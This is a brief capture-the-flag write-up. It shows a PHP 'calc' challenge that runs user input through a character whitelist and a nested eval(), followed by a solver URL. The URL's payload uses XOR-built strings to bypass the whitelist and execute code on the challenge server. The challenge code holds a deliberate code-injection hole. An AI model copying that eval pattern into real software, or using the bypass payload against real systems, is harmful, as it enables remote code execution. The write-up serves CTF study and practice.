## Code
```php
<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}
```

## Solver
`http://139.180.155.171/?calc=%28%27.%7C%27%5E%2724%27%5E%27%7C%2B%27%29.%28%27%7C%27%5E%274%27%5E%27%29%27%29.%28%27%2A%27%5E%27%5E%27%29.%28%27%26%27%26%27%29%27%29.%27%2A%27.%28%27.%27%5E%272%27%5E%27%7C%27%29`
